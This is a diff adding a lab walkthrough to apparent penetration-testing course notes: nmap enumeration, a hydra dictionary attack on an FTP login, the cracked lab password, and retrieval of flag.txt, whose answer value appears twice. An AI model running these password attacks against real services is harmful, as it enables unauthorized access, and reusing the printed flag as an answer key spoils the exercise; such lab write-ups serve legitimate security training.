@@ -41,6 +41,63 @@ Lab 1 - Follow the steps outlined in this section to leverage a dictionary attac
 
 Lab 2 - Enumerate Password Attacks - RDP - VM #1 and find another network service. Use the knowledge from this section to get access as the itadmin user and find the flag.
 >``` shell
+># Enumerate Network Services with Nmap
+>kali@kali:~$ nmap -sV 192.168.123.202
 >
+># Password Attack Against FTP (itadmin)
+>kali@kali:~$ hydra -l itadmin -P /usr/share/wordlists/rockyou.txt ftp://192.168.123.202 -f
+>
+># ========== Expected Result ==========
+>...
+>[21][ftp] host: 192.168.123.202   login: itadmin   password: hellokitty
+>...
+># =====================================
+>
+># Login to FTP
+>kali@kali:~$ ftp 192.168.123.202
+>
+>Name (192.168.123.202:kali): itadmin
+>Password: hellokitty
+>
+># ========== Expected Result ==========
+>230 Login successful.
+>Remote system type is UNIX.
+>Using binary mode to transfer files.
+>ftp>
+># =====================================
+>
+># Locate and Download the Flag
+>ftp> ls
+>
+># ========== Expected Result ==========
+>229 Entering Extended Passive Mode (|||50233|)
+>150 Starting data transfer.
+>-rw-rw-rw- 1 ftp ftp             282 Jun 09  2022 desktop.ini
+>-rw-rw-rw- 1 ftp ftp              38 Dec 19 17:16 flag.txt
+>226 Operation successful
+># =====================================
+>
+>ftp> get flag.txt
+>
+># ========== Expected Result ==========
+>local: flag.txt remote: flag.txt
+>229 Entering Extended Passive Mode (|||50234|)
+>150 Starting data transfer.
+>100% |***********************************************|    38      598.53 KiB/s    00:00 ETA
+>226 Operation successful
+>38 bytes received in 00:00 (279.01 KiB/s)
+># =====================================
+>
+>ftp> bye
+>
+># ========== Expected Result ==========
+>221 Goodbye.
+># =====================================
+>
+>kali@kali:~$ cat flag.txt
+>
+># ========== Expected Result ==========
+>OS{746ace50aabf26dd3ad9bef02b632f92}
+># =====================================
 >```
->
+>OS{746ace50aabf26dd3ad9bef02b632f92}
